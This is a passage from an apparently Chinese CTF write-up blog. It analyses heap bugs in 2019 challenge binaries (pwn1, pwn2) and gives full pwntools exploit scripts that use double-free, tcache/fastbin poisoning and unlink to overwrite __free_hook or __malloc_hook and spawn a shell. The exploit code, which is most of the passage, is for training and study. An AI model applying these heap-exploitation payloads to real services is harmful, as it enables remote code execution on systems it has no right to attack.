u64(io.recv(<span class="number">6</span>).strip().ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))<span class="number">-0x3ebda0</span></span><br><span class="line">    free_hook = libc_base + libc.symbols[<span class="string">'__free_hook'</span>]</span><br><span class="line">    system_addr = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">    io.success(<span class="string">"libc_base: 0x%x"</span> % libc_base)</span><br><span class="line">    </span><br><span class="line">    add(<span class="number">0xe0</span>, <span class="string">'1'</span>) <span class="comment">#1</span></span><br><span class="line">    add(<span class="number">0x10</span>, <span class="string">'2'</span>*<span class="number">0x10</span>) <span class="comment">#2</span></span><br><span class="line">    add(<span class="number">0x18</span>, <span class="string">'3'</span>*<span class="number">0x18</span>) <span class="comment">#3</span></span><br><span class="line">    add(<span class="number">0x80</span>, <span class="string">'4'</span>*<span class="number">0x80</span>) <span class="comment">#4</span></span><br><span class="line">    add(<span class="number">0x20</span>, <span class="string">'5'</span>*<span class="number">0x20</span>) <span class="comment">#5</span></span><br><span class="line">    add(<span class="number">0x20</span>, <span class="string">'6'</span>*<span class="number">0x20</span>) <span class="comment">#6</span></span><br><span class="line">    </span><br><span class="line">    delete(<span class="number">5</span>)</span><br><span class="line">    merge(<span class="number">2</span>, <span class="number">3</span>)</span><br><span class="line">    add(<span class="number">0x20</span>, <span class="string">'7'</span>*<span class="number">0x20</span>)</span><br><span class="line">    delete(<span class="number">7</span>)</span><br><span class="line">    delete(<span class="number">6</span>) <span class="comment">#构造overlap chunk</span></span><br><span class="line">    payload = <span class="string">'a'</span>*<span class="number">0x20</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x31</span>) + p64(free_hook)</span><br><span class="line">    add(<span class="number">0x80</span>, payload) <span class="comment">#6</span></span><br><span class="line">    <span class="comment">#gdb.attach(io)</span></span><br><span class="line">    add(<span class="number">0x20</span>, <span class="string">'/bin/sh\x00'</span>) <span class="comment">#7</span></span><br><span class="line">    add(<span class="number">0x20</span>, p64(system_addr))</span><br><span class="line">    delete(<span class="number">7</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    exp()</span><br><span class="line">    io.interactive()</span><br></pre></td></tr></table></figure><h2 id="2019-网络内生安全试验场-pwn1"><a href="#2019-网络内生安全试验场-pwn1" class="headerlink" title="2019 网络内生安全试验场 pwn1"></a>2019 网络内生安全试验场 pwn1</h2><h3 id="功能分析-1"><a href="#功能分析-1" class="headerlink" title="功能分析"></a>功能分析</h3><ol><li>创建一个堆块</li><li>展示所有堆块</li><li>删除一个堆块</li><li>删除所有堆块</li><li>离开</li></ol><h3 id="漏洞点分析-1"><a href="#漏洞点分析-1" class="headerlink" title="漏洞点分析"></a>漏洞点分析</h3><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="Code" data-labels_right=":" data-labels_copy="Copy Code"><span class="code-caption-label"></span><a class="code-caption-copy">Copy Code</a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">delete</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v1; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( lifecount )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Which life do you want to remove: "</span>);</span><br><span class="line">    __isoc99_scanf(<span class="string">"%d"</span>, &amp;v1);</span><br><span class="line">    <span class="keyword">if</span> ( v1 &gt; <span class="number">0x63</span> || !*(&amp;lifelist + v1) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"Invalid choice"</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    *(_DWORD *)*(&amp;lifelist + v1) = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">free</span>(*((<span class="keyword">void</span> **)*(&amp;lifelist + v1) + <span class="number">1</span>));</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Successful , God !"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"No life in this lonely planet~ "</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"\n"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里存在double free，free后为置空</p><h3 id="漏洞利用过程-1"><a href="#漏洞利用过程-1" class="headerlink" title="漏洞利用过程"></a>漏洞利用过程</h3><p>我是多次利用double free然后成的,这道题说实话很坑，malloc_hook本地改成one_gadget是可以成功的，远程怎么打都打不上，后面学到一个骚操作，double free触发malloc_hook？？？原理我也不清楚，不过确实远程拿到shell了</p><ol><li>利用double free泄露地址</li></ol><p class="code-caption" data-lang="python" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="Code" data-labels_right=":" data-labels_copy="Copy Code"><span class="code-caption-label"></span><a class="code-caption-copy">Copy Code</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">ptr = <span class="number">0x00000000006020E0</span><span class="number">-0x20</span><span class="number">-0x30</span><span class="number">-0x6</span></span><br><span class="line">add(<span class="number">0x30</span>, <span class="string">"a"</span>, <span class="string">"0"</span>) <span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x30</span>, <span class="string">"b"</span>, <span class="string">"1"</span>) <span class="comment">#1</span></span><br><span class="line">delete(<span class="number">0</span>) </span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x30</span>, p64(ptr), <span class="string">'2'</span>) <span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x30</span>, <span class="string">'a'</span>, <span class="string">'3'</span>) <span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x30</span>, <span class="string">'a'</span>, <span class="string">'4'</span>) <span class="comment">#4</span></span><br><span class="line">add(<span class="number">0x30</span>, <span class="string">'a'</span>*<span class="number">0x20</span> + <span class="string">'b'</span>*<span class="number">5</span> , <span class="string">'5'</span>)<span class="comment">#5</span></span><br><span class="line">show()</span><br><span class="line">io.recvuntil(<span class="string">"bbbbb"</span>)</span><br><span class="line">stdout_addr = u64(io.recvuntil(<span class="string">"Level"</span>, drop=<span class="literal">True</span>).ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line">stdout_addr = hex(stdout_addr)[:<span class="number">-2</span>]</span><br><span class="line">stdout_addr = int(stdout_addr, <span class="number">16</span>)</span><br><span class="line">io.success(<span class="string">"stdout_addr: 0x%x"</span> % stdout_addr)</span><br><span class="line"></span><br><span class="line">libc_base = stdout_addr - libc.symbols[<span class="string">'_IO_2_1_stdout_'</span>]</span><br><span class="line">realloc_addr = libc_base + libc.symbols[<span class="string">'__libc_realloc'</span>]</span><br><span class="line">one_gadget = libc_base + <span class="number">0x45216</span> </span><br><span class="line">one_gadget = libc_base + <span class="number">0x4526a</span> </span><br><span class="line">one_gadget = libc_base + <span class="number">0xf02a4</span> </span><br><span class="line">one_gadget = libc_base + <span class="number">0xf1147</span></span><br><span class="line">malloc_hook = libc_base + libc.symbols[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">ptr = malloc_hook<span class="number">-0x20</span><span class="number">-0x3</span></span><br></pre></td></tr></table></figure><ol start="2"><li>利用double free改写地址</li></ol><p class="code-caption" data-lang="python" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="Code" data-labels_right=":" data-labels_copy="Copy Code"><span class="code-caption-label"></span><a class="code-caption-copy">Copy Code</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x60</span>, <span class="string">"a"</span>, <span class="string">"6"</span>)<span class="comment">#6</span></span><br><span class="line">add(<span class="number">0x60</span>, <span class="string">"b"</span>, <span class="string">"7"</span>)<span class="comment">#7</span></span><br><span class="line">delete(<span class="number">6</span>)</span><br><span class="line">delete(<span class="number">7</span>)</span><br><span class="line">delete(<span class="number">6</span>)</span><br><span class="line">add(<span class="number">0x60</span>, p64(ptr), <span class="string">'8'</span>) <span class="comment">#8</span></span><br><span class="line">add(<span class="number">0x60</span>, <span class="string">'a'</span>, <span class="string">'9'</span>) <span class="comment">#9</span></span><br><span class="line">add(<span class="number">0x60</span>, <span class="string">'a'</span>, <span class="string">'10'</span>) <span class="comment">#10</span></span><br><span class="line">add(<span class="number">0x60</span>, <span class="string">'c'</span>*<span class="number">0x10</span>+ <span class="string">'d'</span>*<span class="number">0x3</span> + p64(one_gadget), <span class="string">'6'</span>)</span><br><span class="line">io.success(<span class="string">"malloc_hook: 0x%x"</span> % malloc_hook)</span><br><span class="line">io.success(<span class="string">"libc_base: 0x%x"</span> % libc_base )</span><br><span class="line">io.success(<span class="string">"one_gadget: 0x%x"</span> % one_gadget)</span><br></pre></td></tr></table></figure><ol start="3"><li>getshell</li></ol><p class="code-caption" data-lang="python" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="Code" data-labels_right=":" data-labels_copy="Copy Code"><span class="code-caption-label"></span><a class="code-caption-copy">Copy Code</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br></pre></td></tr></table></figure><p>double free 拿到shell，这里其实malloc一次本地可以拿shell，远程不行，原因未详，可能栈环境对不上</p><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><p class="code-caption" data-lang="python" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="Code" data-labels_right=":" data-labels_copy="Copy Code"><span class="code-caption-label"></span><a class="code-caption-copy">Copy Code</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> PwnContext.core <span class="keyword">import</span> *</span><br><span class="line">local = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Set up pwntools for the correct architecture</span></span><br><span class="line">exe = <span class="string">'./'</span> + <span class="string">'pwn1'</span></span><br><span class="line">elf = context.binary = ELF(exe)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#don't forget to change it</span></span><br><span class="line"><span class="comment">#ctx.binary = './' + 'pwn1'</span></span><br><span class="line">ctx.binary = exe</span><br><span class="line">libc = args.LIBC <span class="keyword">or</span> <span class="string">'libc.so.6'</span></span><br><span class="line">ctx.debug_remote_libc = <span class="literal">True</span></span><br><span class="line">ctx.remote_libc = libc</span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    context.log_level = <span class="string">'debug'</span></span><br><span class="line">    io = ctx.start()</span><br><span class="line">    libc = ELF(libc)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    libc = ELF(libc)</span><br><span class="line">    io = remote(host,port)</span><br><span class="line"><span class="comment">#===========================================================</span></span><br><span class="line"><span class="comment">#                    EXPLOIT GOES HERE</span></span><br><span class="line"><span class="comment">#===========================================================</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Arch:     amd64-64-little</span></span><br><span class="line"><span class="comment"># RELRO:    Partial RELRO</span></span><br><span class="line"><span class="comment"># Stack:    Canary found</span></span><br><span class="line"><span class="comment"># NX:       NX enabled</span></span><br><span class="line"><span class="comment"># PIE:      No PIE (0x400000)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size, name, level)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"Your choice : "</span>, <span class="string">"1"</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"Length of the name :"</span>, str(size))</span><br><span class="line">    io.sendlineafter(<span class="string">"The name of this life :"</span>, name)</span><br><span class="line">    io.sendlineafter(<span class="string">"The level of this life (High/Low) :"</span>, level)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">()</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"Your choice : "</span>, <span class="string">"2"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"Your choice : "</span>, <span class="string">"3"</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"Which life do you want to remove: "</span>, str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">destroy</span><span class="params">()</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"Your choice : "</span>, <span class="string">"4"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exit</span><span class="params">()</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"Your choice : "</span>, <span class="string">"5"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    ptr = <span class="number">0x00000000006020E0</span><span class="number">-0x20</span><span class="number">-0x30</span><span class="number">-0x6</span></span><br><span class="line">    add(<span class="number">0x30</span>, <span class="string">"a"</span>, <span class="string">"0"</span>) <span class="comment">#0</span></span><br><span class="line">    add(<span class="number">0x30</span>, <span class="string">"b"</span>, <span class="string">"1"</span>) <span class="comment">#1</span></span><br><span class="line">    delete(<span class="number">0</span>) </span><br><span class="line">    delete(<span class="number">1</span>)</span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line">    add(<span class="number">0x30</span>, p64(ptr), <span class="string">'2'</span>) <span class="comment">#2</span></span><br><span class="line">    add(<span class="number">0x30</span>, <span class="string">'a'</span>, <span class="string">'3'</span>) <span class="comment">#3</span></span><br><span class="line">    add(<span class="number">0x30</span>, <span class="string">'a'</span>, <span class="string">'4'</span>) <span class="comment">#4</span></span><br><span class="line">    add(<span class="number">0x30</span>, <span class="string">'a'</span>*<span class="number">0x20</span> + <span class="string">'b'</span>*<span class="number">5</span> , <span class="string">'5'</span>)<span class="comment">#5</span></span><br><span class="line">    show()</span><br><span class="line">    io.recvuntil(<span class="string">"bbbbb"</span>)</span><br><span class="line">    stdout_addr = u64(io.recvuntil(<span class="string">"Level"</span>, drop=<span class="literal">True</span>).ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line">    stdout_addr = hex(stdout_addr)[:<span class="number">-2</span>]</span><br><span class="line">    stdout_addr = int(stdout_addr, <span class="number">16</span>)</span><br><span class="line">    io.success(<span class="string">"stdout_addr: 0x%x"</span> % stdout_addr)</span><br><span class="line">    </span><br><span class="line">    libc_base = stdout_addr - libc.symbols[<span class="string">'_IO_2_1_stdout_'</span>]</span><br><span class="line">    realloc_addr = libc_base + libc.symbols[<span class="string">'__libc_realloc'</span>]</span><br><span class="line">    one_gadget = libc_base + <span class="number">0x45216</span> </span><br><span class="line">    one_gadget = libc_base + <span class="number">0x4526a</span> </span><br><span class="line">    one_gadget = libc_base + <span class="number">0xf02a4</span> </span><br><span class="line">    one_gadget = libc_base + <span class="number">0xf1147</span></span><br><span class="line">    malloc_hook = libc_base + libc.symbols[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">    ptr = malloc_hook<span class="number">-0x20</span><span class="number">-0x3</span></span><br><span class="line">    add(<span class="number">0x60</span>, <span class="string">"a"</span>, <span class="string">"6"</span>)<span class="comment">#6</span></span><br><span class="line">    add(<span class="number">0x60</span>, <span class="string">"b"</span>, <span class="string">"7"</span>)<span class="comment">#7</span></span><br><span class="line">    delete(<span class="number">6</span>)</span><br><span class="line">    delete(<span class="number">7</span>)</span><br><span class="line">    delete(<span class="number">6</span>)</span><br><span class="line">    add(<span class="number">0x60</span>, p64(ptr), <span class="string">'8'</span>) <span class="comment">#8</span></span><br><span class="line">    add(<span class="number">0x60</span>, <span class="string">'a'</span>, <span class="string">'9'</span>) <span class="comment">#9</span></span><br><span class="line">    add(<span class="number">0x60</span>, <span class="string">'a'</span>, <span class="string">'10'</span>) <span class="comment">#10</span></span><br><span class="line">    add(<span class="number">0x60</span>, <span class="string">'c'</span>*<span class="number">0x10</span>+ <span class="string">'d'</span>*<span class="number">0x3</span> + p64(one_gadget), <span class="string">'6'</span>)</span><br><span class="line">    io.success(<span class="string">"malloc_hook: 0x%x"</span> % malloc_hook)</span><br><span class="line">    io.success(<span class="string">"libc_base: 0x%x"</span> % libc_base )</span><br><span class="line">    io.success(<span class="string">"one_gadget: 0x%x"</span> % one_gadget)</span><br><span class="line">    delete(<span class="number">2</span>)</span><br><span class="line">    delete(<span class="number">2</span>)</span><br><span class="line">    <span class="comment">#add(0x30, 'a'*0x20+'b'*5,'3')</span></span><br><span class="line">    <span class="comment">#gdb.attach(io)</span></span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    exp()</span><br><span class="line">    io.interactive()</span><br></pre></td></tr></table></figure><h2 id="2019-网络内生安全试验场-pwn2"><a href="#2019-网络内生安全试验场-pwn2" class="headerlink" title="2019 网络内生安全试验场 pwn2"></a>2019 网络内生安全试验场 pwn2</h2><p>实战中遇到最简单的一道了？</p><h3 id="功能分析-2"><a href="#功能分析-2" class="headerlink" title="功能分析"></a>功能分析</h3><ol><li>new一个新堆块</li><li>删除一个堆块</li><li>展示一个堆块</li><li>修改堆块内容，有趣的是，他是固定大小0x100?</li><li>退出</li></ol><h3 id="漏洞点分析-2"><a href="#漏洞点分析-2" class="headerlink" title="漏洞点分析"></a>漏洞点分析</h3><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="Code" data-labels_right=":" data-labels_copy="Copy Code"><span class="code-caption-label"></span><a class="code-caption-copy">Copy Code</a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __<span class="function">int64 <span class="title">record</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"record which?"</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">"%d"</span>, &amp;v1);</span><br><span class="line">  <span class="keyword">if</span> ( buf[v1] != <span class="number">0L</span>L &amp;&amp; v1 &gt;= <span class="number">0</span> &amp;&amp; v1 &lt;= <span class="number">9</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"content?"</span>);</span><br><span class="line">    read(<span class="number">0</span>, buf[v1], <span class="number">0x100</span>uLL);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里是固定大小，所以申请小堆块可以溢出</p><h3 id="漏洞利用过程-2"><a href="#漏洞利用过程-2" class="headerlink" title="漏洞利用过程"></a>漏洞利用过程</h3><ol><li><p>我的思路是溢出后unlink，然后在将两个堆块串联起来，unlink里介绍的手法，就是一个堆块指向另一个堆块存指针的地方，然后编辑一个堆块就是编辑地址，编辑另一个堆块就是编辑内容</p></li><li><p>初始化操作</p></li></ol><p class="code-caption" data-lang="python" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="Code" data-labels_right=":" data-labels_copy="Copy Code"><span class="code-caption-label"></span><a class="code-caption-copy">Copy Code</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"your choice :\n"</span>, <span class="string">"1"</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"please input the size :\n"</span>, str(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"your choice :\n"</span>, <span class="string">"2"</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"delete which ?\n"</span>,str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"your choice :\n"</span>, <span class="string">"3"</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"show which ?\n"</span>, str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">record</span><span class="params">(idx, content)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"your choice :\n"</span>, <span class="string">"4"</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"record which?\n"</span>, str(idx))</span><br><span class="line">    io.sendlineafter(<span class="string">"content?\n"</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exit</span><span class="params">()</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"your choice :\n"</span>, <span class="string">"5"</span>)</span><br></pre></td></tr></table></figure><ol start="3"><li>unlink</li></ol><p class="code-caption" data-lang="python" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="Code" data-labels_right=":" data-labels_copy="Copy Code"><span class="code-caption-label"></span><a class="code-caption-copy">Copy Code</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">ptr = <span class="number">0x6020c0</span></span><br><span class="line">add(<span class="number">0x40</span>)</span><br><span class="line">add(<span class="number">0x80</span>)</span><br><span class="line">add(<span class="number">0x40</span>)</span><br><span class="line">add(<span class="number">0x40</span>)</span><br><span class="line">payload = p64(<span class="number">0</span>) + p64(<span class="number">0x40</span>) + p64(ptr<span class="number">-0x18</span>) + p64(ptr<span class="number">-0x10</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">0x40</span>)</span><br><span class="line">payload += p64(<span class="number">0x40</span>)</span><br><span class="line">payload += p64(<span class="number">0x90</span>)</span><br><span class="line">record(<span class="number">0</span>, payload)</span><br><span class="line">record(<span class="number">1</span>, <span class="string">"1"</span>*<span class="number">0x10</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"><span class="comment">#show(0)</span></span><br></pre></td></tr></table></figure><ol start="4"><li>链接两个堆块</li></ol><p class="code-caption" data-lang="python" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="Code" data-labels_right=":" data-labels_copy="Copy Code"><span class="code-caption-label"></span><a class="code-caption-copy">Copy Code</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x18</span> + p64(<span class="number">0x6020c8</span>+<span class="number">0x8</span>) + p64(<span class="number">0</span>) + p64(elf.got[<span class="string">'puts'</span>])</span><br><span class="line">record(<span class="number">0</span>, payload)</span><br><span class="line">show(<span class="number">2</span>)</span><br></pre></td></tr></table></figure><ol start="5"><li>泄露地址</li></ol><p class="code-caption" data-lang="python" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="Code" data-labels_right=":" data-labels_copy="Copy Code"><span class="code-caption-label"></span><a class="code-caption-copy">Copy Code</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">io.recvuntil(<span class="string">"the content is :"</span>)</span><br><span class="line">io.recvline()</span><br><span class="line">puts_addr = u64(io.recvline().strip().ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line">io.success(<span class="string">"puts_addr: 0x%x"</span> % puts_addr)</span><br><span class="line">libc_base = puts_addr - libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line">system_addr = libc_base + libc.symbols[<span 